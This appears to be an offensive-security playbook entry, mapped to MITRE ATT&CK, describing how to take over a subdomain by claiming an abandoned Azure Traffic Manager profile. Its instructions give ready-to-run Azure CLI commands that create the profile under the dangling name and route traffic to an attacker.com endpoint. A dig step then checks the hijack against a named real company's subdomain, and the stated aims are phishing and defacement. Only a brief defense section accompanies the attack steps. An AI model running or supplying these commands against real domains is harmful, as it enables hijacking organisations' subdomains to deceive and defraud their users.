---
tags:
  - azure
  - subdomain-takeover
  - resource-claim
type: procedure
tools:
  - '[[tools/Azure-CLI]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/az-traffic-manager-create]]'
verified: false
platforms:
  - Azure
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Acquire Infrastructure]]'
updated_at: '2025-12-14T04:38:49.816Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 3e91842a-c17a-4fa3-b448-f9323eb5fc2a
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Acquire Infrastructure]]'
---
# Claim Azure Traffic Manager Profile for Subdomain Takeover

## Summary

This procedure claims an unclaimed Azure Traffic Manager profile by creating it with the exact name from a dangling DNS CNAME, thereby taking control of the associated subdomain. Once claimed, endpoints can be configured to route traffic to attacker-controlled servers, completing the takeover.

## Description

In the attack, after verification, the attacker uses an Azure subscription to create the Traffic Manager profile, inheriting the DNS resolution from the victim's CNAME. The profile's unique DNS name must match exactly. Post-creation, add endpoints (e.g., external to a malicious site) to redirect traffic. Prerequisites: Active Azure subscription with permissions to create Traffic Manager resources. Outcomes: Full control over subdomain traffic, enabling phishing or defacement.

## Requirements

1. Azure subscription with contributor role on a resource group
2. The unique DNS name (e.g., mydailydev.trafficmanager.net)
3. Azure CLI installed and authenticated

## Defense

Defensive measures and detection strategies:

- Monitor Azure activity logs for Traffic Manager creations with suspicious names
- Use Azure Policy to restrict profile naming and require approvals
- Implement subdomain protection via DNS firewalls like Azure Private DNS

## Objectives

1. Register the abandoned Azure resource to gain ownership
2. Configure routing to attacker infrastructure
3. Hijack subdomain for malicious use

## Instructions

### Step 1: Create the Traffic Manager Profile

**Context**: Initiate the claim by creating the profile with the dangling name.

**Command** ([[commands/az-traffic-manager-create]]):
```bash
az network traffic-manager profile create --resource-group myResourceGroup --name mydailydev --routing-method Performance --unique-dns-name mydailydev.trafficmanager.net
```

> This claims the global name. Expected output: JSON with profile details, including DNS config.

### Step 2: Add Malicious Endpoint

**Context**: Route traffic to attacker-controlled server.

**Command**:
```bash
az network traffic-manager endpoint create --resource-group myResourceGroup --profile-name mydailydev --name attackerEndpoint --type externalEndpoints --target attacker.com:80
```

> Sets up redirection. Expected: Endpoint added successfully.

### Step 3: Verify Takeover

**Context**: Confirm DNS now resolves to the new profile.

Use dig:

```bash
dig mydailydev.starbucks.com
```

> Should resolve to attacker.com via the Traffic Manager.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Acquire Infrastructure]] Acquire Infrastructure

### Sub-Techniques

-

## Commands Used

- [[commands/az-traffic-manager-create]]

## Tools Used

- [[tools/Azure-CLI]]

## Tags

- [[azure]]
- [[subdomain-takeover]]
- [[resource-claim]]
